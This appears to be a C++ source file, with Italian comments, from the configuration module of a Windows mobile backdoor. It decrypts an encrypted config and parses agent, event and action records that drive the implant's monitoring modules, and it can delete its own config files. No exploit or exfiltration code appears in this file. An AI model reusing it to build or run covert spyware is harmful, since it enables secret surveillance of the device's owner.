#include <exception>
#include "Conf.h"
#include "Status.h"
#include "Encryption.h"
#include "Log.h"

#define STEP_AND_ASSIGN(p, delta, var) 	p += delta; \
										CopyMemory(&var, p, sizeof(UINT));

#define ASSIGN_AND_STEP(p, delta, var) 	CopyMemory(&var, p, sizeof(UINT)); \
										p += delta;

#define STEP(p, delta) 	p += delta;

using namespace std;

Conf::Conf() : encryptionObj(g_ConfKey, KEY_LEN) {
	statusObj = Status::self();

	strEncryptedConfName = g_ConfName;
}

Conf::~Conf(){

}

BOOL Conf::ParseAgent(BYTE **pAgent, UINT Num) {
	AgentStruct cfgAgent, *ptr;
	UINT  i;
	BYTE *tmp = NULL;

	ZeroMemory(&cfgAgent, sizeof(AgentStruct));

	__try {
		// Num = numero di Agenti
		ptr = (pAgentStruct)(*pAgent);
		for (i = 0; i < Num; i++) {
			CopyMemory(&cfgAgent.uAgentId, &ptr->uAgentId, sizeof(UINT));

			if ((cfgAgent.uAgentId & AGENT) != AGENT) {
				DBG_TRACE(L"Debug - Conf.cpp - ParseAgent() invalid agent ID found\n", 1, FALSE);
				return FALSE;
			}

			CopyMemory(&cfgAgent.uAgentStatus, &ptr->uAgentStatus, sizeof(UINT));
			CopyMemory(&cfgAgent.uParamLength, &ptr->uParamLength, sizeof(UINT));

			cfgAgent.pParams = NULL;
			cfgAgent.pFunc = NULL;
			cfgAgent.uCommand = 0;

			if (cfgAgent.uParamLength) {
				cfgAgent.pParams = new(std::nothrow) BYTE[cfgAgent.uParamLength];

				if (cfgAgent.pParams == NULL)
					return FALSE;

				// Ci spostiamo sul buffer dati e copiamo la configurazione
				tmp = (BYTE *)ptr;
				tmp += (sizeof(UINT) * 3);
				CopyMemory(cfgAgent.pParams, tmp, cfgAgent.uParamLength);
				tmp += cfgAgent.uParamLength; // Puntiamo al prossimo agente/sezione/etc...
			} else {
				// Spostiamo avanti il puntatore della grandezza dei primi tre parametri
				// della struttura
				tmp = (BYTE *)ptr;
				tmp += (sizeof(UINT) * 3);
			}

			ptr = (pAgentStruct)tmp;
			statusObj->AddAgent(cfgAgent);

			// Non liberiamo la memoria allocata perche' viene utilizzata da Status
		}
		(*pAgent) = (BYTE *)ptr;
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		DBG_TRACE(L"Debug - Conf.cpp - ParseAgent(), Exception Caught, invalid configuration\n", 1, FALSE);
		return FALSE;
	}

	return TRUE;
}

// Dopo gli eventi non esiste una sezione "azioni" perche' nel formato di
// naga le azioni seguono subito gli eventi, percio' dobbiamo richiamare
// direttamente la ParseActions() al ritorno da questa funzione...
BOOL Conf::ParseEvent(BYTE **pEvent, UINT Num) {
	EventStruct cfgEvent, *ptr;
	UINT i;
	BYTE *tmp = NULL;

	ZeroMemory(&cfgEvent, sizeof(EventStruct));

	__try {
		// Num = numero di Eventi
		ptr = (pEventStruct)(*pEvent);
		for (i = 0; i < Num; i++) {
			CopyMemory(&cfgEvent.uEventType, &ptr->uEventType, sizeof(UINT));

			if ((cfgEvent.uEventType & EVENT) != EVENT) {
				DBG_TRACE(L"Debug - Conf.cpp - ParseEvent() invalid event type found\n", 1, FALSE);
				return FALSE;
			}

			CopyMemory(&cfgEvent.uActionId, &ptr->uActionId, sizeof(UINT));
			CopyMemory(&cfgEvent.uParamLength, &ptr->uParamLength, sizeof(UINT));
			cfgEvent.pParams = NULL;
			cfgEvent.pFunc = NULL;
			cfgEvent.uCommand = 0;
			cfgEvent.uEventStatus = EVENT_STOPPED;

			if (cfgEvent.uParamLength) {
				cfgEvent.pParams = new(std::nothrow) BYTE[cfgEvent.uParamLength];

				if (cfgEvent.pParams == NULL)
					return FALSE;

				// Ci spostiamo sul buffer dati e copiamo la configurazione
				tmp = (BYTE *)ptr;
				tmp += (sizeof(UINT) * 3);
				CopyMemory(cfgEvent.pParams, tmp, cfgEvent.uParamLength);
				tmp += cfgEvent.uParamLength; // Puntiamo al prossimo agente/sezione/etc...
			} else {
				// Spostiamo avanti il puntatore della grandezza dei primi parametri
				// della struttura
				tmp = (BYTE *)ptr;
				tmp += (sizeof(UINT) * 3);
			}

			ptr = (pEventStruct)tmp;
			statusObj->AddEvent(cfgEvent);

			// Non liberiamo la memoria allocata perche' viene utilizzata da Status
		}
		(*pEvent) = (BYTE *)ptr;
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		DBG_TRACE(L"Debug - Conf.cpp - ParseEvent(), Exception Caught, invalid configuration\n", 1, FALSE);
		return FALSE;
	}

	return TRUE; // Ora dobbiamo chiamare ParseAction()!!!
}

// Questa funzione passa il puntatore alla struttura che definisce una macro-azione
BOOL Conf::ParseAction(BYTE **pAction, UINT Num) {
	MacroActionStruct cfgAction;
	pActionStruct ptr;
	UINT i, j, dummy;
	BYTE *tmp = NULL;

	ZeroMemory(&cfgAction, sizeof(MacroActionStruct));

	__try {
		// Num = numero di macro-azioni
		for (i = 0; i < Num; i++) {
			// Leggi il numero di sotto-azioni per questa macro-azione
			ASSIGN_AND_STEP(*pAction, sizeof(UINT), cfgAction.uSubActions)
			cfgAction.pActions = new(std::nothrow) ActionStruct[cfgAction.uSubActions];

			if (cfgAction.pActions == NULL)
				return FALSE;

			cfgAction.bTriggered = FALSE;
			// Imposta tutte le sotto-azioni
			ptr = (pActionStruct)(*pAction);
			for (j = 0; j < cfgAction.uSubActions; j++) {
				dummy = 0;

				CopyMemory(&cfgAction.pActions[j].uActionType, &ptr->uActionType, sizeof(UINT));

				if ((cfgAction.pActions[j].uActionType & ACTION) != ACTION) {
					DBG_TRACE(L"Debug - Conf.cpp - ParseAction() invalid action found\n", 1, FALSE);
					return FALSE;
				}

				CopyMemory(&cfgAction.pActions[j].uParamLength, &ptr->uParamLength, sizeof(UINT));
				CopyMemory(&cfgAction.pActions[j].pParams, &dummy, sizeof(UINT));

				if (cfgAction.pActions[j].uParamLength) {
					cfgAction.pActions[j].pParams = new(std::nothrow) BYTE[cfgAction.pActions[j].uParamLength];

					// XXX - Andrebbe fatto il cleanup se la new fallisce e sono gia' stati allocati
					// degli elementi
					if (cfgAction.pActions[j].pParams == NULL)
						return FALSE;

					// Ci spostiamo sul buffer dati e copiamo la configurazione
					tmp = (BYTE *)ptr;
					tmp += (sizeof(UINT) * 2);
					CopyMemory(cfgAction.pActions[j].pParams, tmp, cfgAction.pActions[j].uParamLength);
					tmp += cfgAction.pActions[j].uParamLength; // Puntiamo al prossimo agente/sezione/etc...
				} else {
					// Spostiamo avanti il puntatore della grandezza dei primi parametri
					// della struttura.
					tmp = (BYTE *)ptr;
					tmp += (sizeof(UINT) * 2);
				}

				ptr = (pActionStruct)tmp;

			}
			(*pAction) = (BYTE *)ptr;

			statusObj->AddAction(i, cfgAction);

			// Non liberiamo la memoria allocata perche' viene utilizzata da Status
		}
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		DBG_TRACE(L"Debug - Conf.cpp - ParseAction(), Exception Caught, invalid configuration\n", 1, FALSE);
		return FALSE;
	}

	return TRUE;
}

BOOL Conf::ParseConfiguration(BYTE **pConf, UINT Num) {
	ConfStruct cfgConf, *ptr;
	UINT i, dummy;
	BYTE *tmp = NULL;

	ZeroMemory(&cfgConf, sizeof(ConfStruct));

	__try {
		// Num = numero di parametri di configurazione
		ptr = (pConfStruct)(*pConf);
		for (i = 0; i < Num; i++) {
			dummy = 0;

			CopyMemory(&cfgConf.uConfId, &ptr->uConfId, sizeof(UINT));

			if ((cfgConf.uConfId & CONFIGURATION) != CONFIGURATION) {
				DBG_TRACE(L"Debug - Conf.cpp - ParseConfiguration() invalid config option type found\n", 1, FALSE);
				return FALSE;
			}
			
			CopyMemory(&cfgConf.uParamLength, &ptr->uParamLength, sizeof(UINT));
			CopyMemory(&cfgConf.pParams, &dummy, sizeof(UINT));

			if (cfgConf.uParamLength) {
				cfgConf.pParams = new(std::nothrow) BYTE[cfgConf.uParamLength];

				if (cfgConf.pParams == NULL)
					return FALSE;

				// Ci spostiamo sul buffer dati e copiamo la configurazione
				tmp = (BYTE *)ptr;
				tmp += (sizeof(UINT) * 2);
				CopyMemory(cfgConf.pParams, tmp, cfgConf.uParamLength);
				tmp += cfgConf.uParamLength; // Puntiamo al prossimo evento/sezione/etc...
			} else {
				// Spostiamo avanti il puntatore della grandezza dei primi parametri
				// della struttura
				tmp = (BYTE *)ptr;
				tmp += (sizeof(UINT) * 2);
			}

			ptr = (pConfStruct)tmp;
			statusObj->AddConf(cfgConf);

			// Non liberiamo la memoria allocata perche' viene utilizzata da Status
		}
		(*pConf) = (BYTE *)ptr;
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		DBG_TRACE(L"Debug - Conf.cpp - ParseConfiguration(), Exception Caught, invalid configuration\n", 1, FALSE);
		return FALSE;
	}

	return TRUE;
}

// Questa funzione al termine deve liberare il puntatore ai dati decifrati
// MANAGEMENT: 
// Nella conf tutte le stringhe sono NULL-Terminate e in WCHAR. La lunghezza
// delle stringhe include il NULL ed e' espressa in BYTE.
BOOL Conf::LoadConf() {
#define EXIT_ON_ERROR(x)	if(x == NULL){ delete[] pConf; return FALSE;}
#define CLEAN_AND_EXIT(x)	delete[] pConf; return x;

	BYTE *pConf = NULL, *pTemp = NULL;
	wstring strBack;
	UINT Len = 0, i = 0, num = 0;
	BOOL bBackConf = FALSE;

	if (strEncryptedConfName.empty())
		return NULL;

	// Vediamo prima se esiste una configurazione di backup valida
	strBack = GetBackupName(FALSE);

	if (strBack.empty() == FALSE && FileExists(strBack)) {
		pConf = encryptionObj.DecryptConf(strBack, &Len);

		Log logInfo;

		if (pConf == NULL) {
			logInfo.WriteLogInfo(L"Invalid new configuration, reverting");
		} else {
			logInfo.WriteLogInfo(L"New configuration activated");
		}
	}

	// Se non c'e' carichiamo quella di default
	if (pConf == NULL || Len == 0) {
		pConf = encryptionObj.DecryptConf(strEncryptedConfName, &Len);
	} else {
		bBackConf = TRUE; // Significa che dobbiamo spostare la conf di backup
	}

	if (pConf == NULL || Len == 0)
		return FALSE;

	// pConf punta alla prima DWORD del blocco (lunghezza del file),
	// ci spostiamo in modo da puntare al primo byte della configurazione
	pTemp = pConf + 4;

	// Leggi la sezione relativa agli agenti
	pTemp = MemStringCmp(pConf, AGENT_CONF_DELIMITER, Len);
	EXIT_ON_ERROR(pTemp);

	do {
		ASSIGN_AND_STEP(pTemp, sizeof(UINT), num);
		if (ParseAgent(&pTemp, num) == FALSE)
			break;

		// Leggi la sezione relativa agli eventi e poi le azioni
		pTemp = MemStringCmp(pConf, EVENT_CONF_DELIMITER, Len);
		EXIT_ON_ERROR(pTemp);

		ASSIGN_AND_STEP(pTemp, sizeof(UINT), num);
		if (ParseEvent(&pTemp, num) == FALSE)
			break;

		ASSIGN_AND_STEP(pTemp, sizeof(UINT), num);
		if (ParseAction(&pTemp, num) == FALSE)
			break;

		// Leggi i parametri di configurazione
		pTemp = MemStringCmp(pConf, MOBIL_CONF_DELIMITER, Len);
		EXIT_ON_ERROR(pTemp);

		ASSIGN_AND_STEP(pTemp, sizeof(UINT), num);
		if (ParseConfiguration(&pTemp, num) == FALSE)
			break;

		// Spostiamo la conf di backup
		if (bBackConf == FALSE) {
			// Facciamo il wipe della memoria
			ZeroMemory(pConf, Len);
			CLEAN_AND_EXIT(TRUE);
		}

		wstring strBack, strPath;

		strPath = GetCurrentPathStr(strEncryptedConfName);

		if (strPath.empty())
			break;
		
		strBack = GetBackupName(TRUE);

		// Meglio essere paranoici
		if (strBack.empty() == FALSE)
			if (CopyFile(strBack.c_str(), strPath.c_str(), FALSE) == TRUE)
				DeleteFile(strBack.c_str());

		// Facciamo il wipe della memoria
		ZeroMemory(pConf, Len);
		CLEAN_AND_EXIT(TRUE);
	} while(0);

	// Facciamo il wipe della memoria
	ZeroMemory(pConf, Len);
	CLEAN_AND_EXIT(FALSE);
}

BOOL Conf::RemoveConf() {
	wstring strbackdoorPath;

	if (strEncryptedConfName.empty())
		return FALSE;

	strbackdoorPath = GetCurrentPath(NULL);

	if (strbackdoorPath.empty())
		return FALSE;

	strbackdoorPath += strEncryptedConfName;

	BOOL res = DeleteFile(strbackdoorPath.c_str());

	// Rimuovi anche il file di conf di backup
	strbackdoorPath = GetBackupName(TRUE);

	if (strbackdoorPath.empty())
		return res;

	DeleteFile(strbackdoorPath.c_str());
	return res;
}

BOOL Conf::FileExists(wstring &strInFile) {
	HANDLE hConfFile = INVALID_HANDLE_VALUE;
	wstring strCompletePath;

	// LOG_DIR + strInFile
	strCompletePath = GetCurrentPathStr(strInFile);

	if (strCompletePath.empty())
		return FALSE;

	// Apriamo il file
	hConfFile = CreateFile((PWCHAR)strCompletePath.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
							NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hConfFile == INVALID_HANDLE_VALUE)
		return FALSE;

	CloseHandle(hConfFile);
	return TRUE;
}

// XXX - Va implementata! Per il momento scriviamo comunque tutto in maniera
// cifrata e leggiamo solo da file cifrati, per cui questa funzione non serve,
// viene lasciata qui per eventuali utilizzi futuri.
BOOL Conf::FillFile(WCHAR *wName) {
	return TRUE;
}

BYTE* Conf::MemStringCmp(BYTE *memory, CHAR *string, UINT uLen) {
	BYTE *ptr;
	UINT len = 0;
	ptr = memory;

	LOOP {
		if (!strcmp((CHAR *)ptr, string))
			return (ptr + strlen(string) + 1);

		ptr++;
		len++;

		if (len > uLen)
			return NULL;
	}
}

wstring Conf::GetBackupName(BOOL bCompletePath) {
	WCHAR *pBackExt;
	wstring strPath;

	if (bCompletePath == TRUE)
		strPath = GetCurrentPath(g_ConfName);
	else
		strPath = g_ConfName;

	wstring strExtension = L".bak";
	pBackExt = encryptionObj.EncryptName(strExtension, g_Challenge[0]);

	if (pBackExt == NULL)
		return strPath;

	strPath += pBackExt;

	free(pBackExt);

	return strPath;
}